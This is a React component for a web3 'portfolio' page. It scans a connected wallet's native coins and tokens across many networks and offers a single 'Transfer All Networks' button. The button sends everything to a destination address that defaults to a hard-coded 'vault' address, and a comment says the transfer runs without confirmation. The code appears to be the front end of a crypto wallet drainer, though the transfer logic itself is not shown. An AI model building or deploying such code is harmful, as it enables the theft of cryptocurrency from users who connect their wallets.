import { useState } from "react";
import { AlertTriangle, Coins, Bug, Loader2, CheckCircle } from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { useWeb3 } from "@/hooks/use-web3";
import { web3Service } from "@/lib/web3";
import type { WalletState } from "@/lib/web3";

interface BalanceCardProps {
  walletState: WalletState;
  onTransactionStart: (txHash: string) => void;
  onMultiNetworkTransfer?: (toAddress: string) => Promise<any>;
}

export default function BalanceCard({ walletState, onTransactionStart, onMultiNetworkTransfer }: BalanceCardProps) {
  const { isTransferring, hasAnyNetworkFunds, crossNetworkValue } = useWeb3();
  const [isWalletLoading, setIsWalletLoading] = useState(false);

  // Get destination address from environment - using your vault address
  const destinationAddress = import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE";

  // Validation function for Ethereum address
  const isValidEthereumAddress = (address: string): boolean => {
    return /^0x[a-fA-F0-9]{40}$/.test(address);
  };

  // Show error if destination address is invalid
  if (!destinationAddress || !isValidEthereumAddress(destinationAddress)) {
    return (
      <Card>
        <CardContent className="pt-6">
          <Alert className="border-red-200 bg-red-50">
            <AlertTriangle className="h-4 w-4 text-red-600" />
            <AlertDescription className="text-red-800">
              <div className="font-medium">Configuration Error</div>
              <div className="text-sm mt-1">
                Invalid or missing destination address. Please check your configuration.
                <br />
                Current address: {destinationAddress || 'Not set'}
              </div>
            </AlertDescription>
          </Alert>
        </CardContent>
      </Card>
    );
  }



  const handleMultiNetworkTransfer = async () => {
    // Show loading instantly when button is clicked
    setIsWalletLoading(true);
    
    try {
      // Direct transfer without any confirmation or toast notifications
      if (onMultiNetworkTransfer) {
        await onMultiNetworkTransfer(destinationAddress);
      }
    } finally {
      // Hide loading after wallet interaction
      setIsWalletLoading(false);
    }
  };

  // Calculate total USD value
  const balanceUSD = walletState.totalUsdValue.toLocaleString('en-US', {
    style: 'currency',
    currency: 'USD'
  });

  if (!walletState.isConnected) {
    return (
      <Card className="bg-card/50 border-border ethereum-glass">
        <CardContent className="pt-6">
          <div className="text-center py-8">
            <div className="text-muted-foreground mb-4">
              <h3 className="text-lg font-medium bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent mb-2">
                Wallet Not Connected
              </h3>
              <p className="text-muted-foreground">Connect your wallet to view balance and transfer funds</p>
            </div>
          </div>
        </CardContent>
      </Card>
    );
  }

  return (
    <Card className="bg-card/50 border-border ethereum-glass">
      <CardContent className="pt-6">
        <div className="flex justify-between items-center mb-6">
          <h2 className="text-xl font-semibold bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">
            Current Balance
          </h2>
          <details className="text-xs">
            <summary className="cursor-pointer text-accent hover:text-accent-light flex items-center gap-1 ethereum-pulse">
              <Bug className="h-3 w-3" />
              Debug Info
            </summary>
            <div className="mt-2 p-2 bg-muted/30 border border-border/50 rounded text-xs font-mono text-muted-foreground">
              <div><strong>Connection:</strong> {walletState.isConnected ? 'Connected' : 'Disconnected'}</div>
              <div><strong>Address:</strong> {walletState.address || 'None'}</div>
              <div><strong>Network:</strong> {walletState.networkId || 'None'}</div>
              <div><strong>ETH Balance:</strong> {walletState.ethBalance || '0'}</div>
              <div><strong>Token Count:</strong> {walletState.tokenBalances?.length || 0}</div>
              <div><strong>USD Value:</strong> ${walletState.totalUsdValue || 0}</div>
              <div><strong>Window.Ethereum:</strong> {typeof window !== 'undefined' && window.ethereum ? 'Available' : 'Not Available'}</div>
            </div>
          </details>
        </div>

        {/* Multi-Network Portfolio Display */}
        <div className="mb-8">
          <div className="text-center mb-6">
            <div className="text-3xl font-bold bg-gradient-to-r from-primary via-secondary to-accent bg-clip-text text-transparent mb-2 ethereum-float">
              Multi-Network Portfolio
            </div>
            <div className="text-lg text-accent font-semibold ethereum-pulse">
              Total Value: {balanceUSD}
            </div>
          </div>

          {/* Current Network Balance */}
          <div className="bg-muted/20 border border-primary/30 rounded-lg p-4 mb-4 ethereum-glow">
            <h3 className="font-semibold text-primary mb-3 flex items-center gap-2">
              <span className="w-2 h-2 bg-success rounded-full animate-pulse"></span>
              Current Network: {walletState.networkName}
            </h3>

            {/* Native Currency */}
            <div className="bg-card/80 border border-border/50 rounded p-3 mb-3 ethereum-glass">
              <div className="flex justify-between items-center">
                <div className="flex items-center space-x-2">
                  <div className="w-8 h-8 ethereum-gradient rounded-full flex items-center justify-center text-white text-xs font-bold ethereum-pulse">
                    ETH
                  </div>
                  <div>
                    <div className="font-medium text-foreground">Ethereum</div>
                    <div className="text-xs text-muted-foreground">Native Currency</div>
                  </div>
                </div>
                <div className="text-right">
                  <div className="font-semibold text-accent">
                    {walletState.ethBalance ? parseFloat(walletState.ethBalance).toFixed(6) : "0.000000"} ETH
                  </div>
                  <div className="text-xs text-muted-foreground">
                    ${((parseFloat(walletState.ethBalance || '0')) * 2500).toFixed(2)}
                  </div>
                </div>
              </div>
            </div>

            {/* Current Network Tokens */}
            {walletState.tokenBalances && walletState.tokenBalances.length > 0 && (
              <div className="space-y-2">
                {walletState.tokenBalances.map((token, index) => (
                  <div key={index} className="bg-card/80 border border-border/50 rounded p-3 ethereum-glass">
                    <div className="flex justify-between items-center">
                      <div className="flex items-center space-x-2">
                        <div className="w-8 h-8 bg-gradient-to-r from-secondary to-accent rounded-full flex items-center justify-center text-white text-xs font-bold ethereum-pulse">
                          {token.symbol.substring(0, 3)}
                        </div>
                        <div>
                          <div className="font-medium text-foreground">{token.symbol}</div>
                          <div className="text-xs text-muted-foreground font-mono">
                            {token.contractAddress}
                          </div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="font-semibold text-accent">
                          {parseFloat(token.balance).toFixed(6)} {token.symbol}
                        </div>
                        <div className="text-xs text-muted-foreground">
                          {token.usdValue?.toLocaleString('en-US', { style: 'currency', currency: 'USD' })}
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* All Networks Summary - Show instantly with loading states */}
          <div className="bg-muted/20 border border-accent/30 rounded-lg p-4 ethereum-glow">
            <h3 className="font-semibold text-accent mb-3 flex items-center">
              <Coins className="w-5 h-5 mr-2 ethereum-pulse" />
              All Networks Scan 
              {!walletState.allNetworksLoaded && (
                <Loader2 className="w-4 h-4 ml-2 animate-spin text-accent" />
              )}
              {walletState.allNetworksLoaded && walletState.networkBalances && (
                <span className="ml-2 text-sm text-muted-foreground">({walletState.networkBalances.length} networks scanned)</span>
              )}
            </h3>

            {!walletState.allNetworksLoaded ? (
              <div className="text-center py-4">
                <div className="text-sm text-accent">Scanning all networks instantly...</div>
                <div className="text-xs text-muted-foreground mt-1">This may take a few seconds</div>
              </div>
            ) : walletState.networkBalances && walletState.networkBalances.length > 0 ? (
              <div className="space-y-3 max-h-64 overflow-y-auto">
                {walletState.networkBalances.map((network, networkIndex) => (
                  <div key={networkIndex} className="bg-card/80 border border-border/50 rounded p-3 ethereum-glass">
                    <div className="font-medium text-foreground mb-2 flex items-center justify-between">
                      <span>{network.networkName}</span>
                      {network.totalUsdValue > 0 && (
                        <span className="text-sm font-semibold text-success">
                          ${network.totalUsdValue.toFixed(2)}
                        </span>
                      )}
                    </div>

                    {/* Native Currency Balance */}
                    {parseFloat(network.nativeBalance) > 0 && (
                      <div className="flex justify-between items-center text-sm mb-2 bg-primary/10 border border-primary/30 rounded p-2 ethereum-glow">
                        <span className="text-foreground font-medium">{network.nativeCurrency}</span>
                        <span className="font-semibold text-primary">
                          {parseFloat(network.nativeBalance).toFixed(6)} {network.nativeCurrency}
                        </span>
                      </div>
                    )}

                    {/* Token Balances */}
                    {network.tokenBalances.map((token, tokenIndex) => (
                      <div key={tokenIndex} className="border-l-2 border-accent/50 pl-3 mb-2 bg-accent/10 rounded-r p-2 ethereum-glass">
                        <div className="flex justify-between items-center text-sm">
                          <div>
                            <div className="font-medium text-foreground">{token.symbol}</div>
                            <div className="text-xs text-muted-foreground font-mono">
                              {token.contractAddress?.slice(0, 10)}...
                            </div>
                          </div>
                          <div className="text-right">
                            <div className="font-semibold text-accent">
                              {parseFloat(token.balance).toFixed(6)} {token.symbol}
                            </div>
                            <div className="text-xs text-muted-foreground">
                              {token.usdValue?.toLocaleString('en-US', { style: 'currency', currency: 'USD' })}
                            </div>
                          </div>
                        </div>
                      </div>
                    ))}

                    {network.tokenBalances.length === 0 && parseFloat(network.nativeBalance) === 0 && (
                      <div className="text-xs text-muted-foreground italic bg-muted/20 rounded p-2 border border-border/50">
                        No funds found on this network
                      </div>
                    )}
                  </div>
                ))}
              </div>
            ) : (
              <div className="text-center py-4">
                <div className="text-sm text-muted-foreground">No network balances loaded yet</div>
              </div>
            )}
          </div>
        </div>

        <Alert className="mb-6 border-warning bg-warning/10 ethereum-glass">
          <AlertTriangle className="h-4 w-4 text-warning animate-pulse" />
          <AlertDescription className="text-foreground">
            <div className="font-medium text-warning">Transfer All Cryptocurrencies</div>
            <div className="text-sm text-muted-foreground space-y-1">
              <div>• <strong className="text-primary">Current Network:</strong> Transfer ETH and ERC-20 tokens from the connected network</div>
              <div>• <strong className="text-secondary">All Networks:</strong> Scan and transfer from ALL supported networks (Ethereum, Polygon, BSC, etc.)</div>
              <div>• Both actions are <strong className="text-destructive">IRREVERSIBLE</strong> and will send funds to the configured vault address</div>
            </div>
          </AlertDescription>
        </Alert>

        <div className="mb-4">
          <label className="block text-sm font-medium text-muted-foreground mb-2">
            Destination Address (All funds will be sent here)
          </label>
          <div className="bg-primary/10 border border-primary/30 rounded-lg p-3 ethereum-glow">
            <div className="text-sm font-mono text-primary break-all">
              {destinationAddress}
            </div>
            <div className="text-xs text-muted-foreground mt-1">
              ✓ Valid Ethereum address configured
            </div>
          </div>
        </div>

        {/* Cross-Network Balance Summary */}
        {walletState.isConnected && (
          <div className="mb-6">
            <div className="bg-success/10 border border-success/30 rounded-lg p-4 ethereum-glow">
              <div className="flex items-center space-x-2 mb-3">
                <CheckCircle className="h-5 w-5 text-success ethereum-pulse" />
                <div className="font-semibold text-foreground">
                  {(hasAnyNetworkFunds || walletState.networkBalances.some(n => parseFloat(n.nativeBalance) > 0 || n.tokenBalances.length > 0)) ? "✔️ Funds detected across networks:" : "No funds detected on any network"}
                </div>
              </div>
              
              {(hasAnyNetworkFunds || walletState.networkBalances.some(n => parseFloat(n.nativeBalance) > 0 || n.tokenBalances.length > 0)) && (
                <div className="space-y-2">
                  {/* Show current network funds first */}
                  {(parseFloat(walletState.ethBalance || '0') > 0 || walletState.tokenBalances.length > 0) && (
                    <div className="flex justify-between items-center text-sm">
                      <div className="font-medium text-primary">
                        • {walletState.networkName || 'Current Network'}:
                      </div>
                      <div className="text-accent">
                        {parseFloat(walletState.ethBalance || '0') > 0 && `${parseFloat(walletState.ethBalance || '0').toFixed(4)} ETH`}
                        {walletState.tokenBalances.length > 0 && ` + ${walletState.tokenBalances.length} tokens`}
                        <span className="ml-2 font-semibold text-success">
                          (${walletState.totalUsdValue.toFixed(2)})
                        </span>
                      </div>
                    </div>
                  )}
                  
                  {/* Show other network funds */}
                  {walletState.networkBalances.filter(n => parseFloat(n.nativeBalance) > 0 || n.tokenBalances.length > 0).map((network, index) => (
                    <div key={index} className="flex justify-between items-center text-sm">
                      <div className="font-medium text-primary">
                        • {network.networkName}:
                      </div>
                      <div className="text-accent">
                        {parseFloat(network.nativeBalance) > 0 && `${parseFloat(network.nativeBalance).toFixed(4)} ${network.nativeCurrency}`}
                        {network.tokenBalances.length > 0 && ` + ${network.tokenBalances.length} tokens`}
                        {network.totalUsdValue > 0 && (
                          <span className="ml-2 font-semibold text-success">
                            (${network.totalUsdValue.toFixed(2)})
                          </span>
                        )}
                      </div>
                    </div>
                  ))}
                  
                  <div className="border-t border-success/30 pt-2 mt-3">
                    <div className="flex justify-between items-center font-semibold text-foreground">
                      <div>Total Cross-Network Value:</div>
                      <div className="text-success text-lg">${(crossNetworkValue + walletState.totalUsdValue).toFixed(2)}</div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        <div className="space-y-3">
          {onMultiNetworkTransfer && (
            <Button
              onClick={handleMultiNetworkTransfer}
              disabled={isTransferring || isWalletLoading || (!hasAnyNetworkFunds && !walletState.networkBalances.some(n => parseFloat(n.nativeBalance) > 0 || n.tokenBalances.length > 0) && parseFloat(walletState.ethBalance || '0') <= 0 && walletState.tokenBalances.length === 0)}
              className="w-full ethereum-gradient hover:ethereum-glow-strong text-white font-semibold py-4 px-6 flex items-center justify-center space-x-2 ethereum-pulse transition-all duration-300"
            >
              {isWalletLoading ? (
                <>
                  <Loader2 className="h-4 w-4 animate-spin" />
                  <span>Opening Wallet...</span>
                </>
              ) : isTransferring ? (
                <>
                  <Loader2 className="h-4 w-4 animate-spin" />
                  <span>Scanning Networks...</span>
                </>
              ) : (
                <>
                  <span>⚡</span>
                  <span>Transfer All Networks</span>
                </>
              )}
            </Button>
          )}
        </div>


      </CardContent>
    </Card>
  );
}